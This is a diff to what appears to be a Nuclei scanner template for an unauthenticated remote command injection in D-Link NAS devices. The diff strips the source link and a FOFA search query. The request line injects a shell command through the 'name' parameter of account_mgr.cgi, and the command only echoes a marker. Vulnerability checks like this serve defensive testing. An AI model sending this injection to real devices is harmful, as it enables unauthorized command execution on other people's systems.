@@ -3,12 +3,8 @@ info:
   name: D-Link NAS设备account_mgr.cgi-未授权RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qp15c7mx6xgtnkni'
+  description: ''
   tags: rce,unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qp15c7mx6xgtnkni
-    fofa: app="D_Link-DNS-ShareCenter"
 http:
 - raw:
   - 'GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;echo+123456;%27 HTTP/1.1
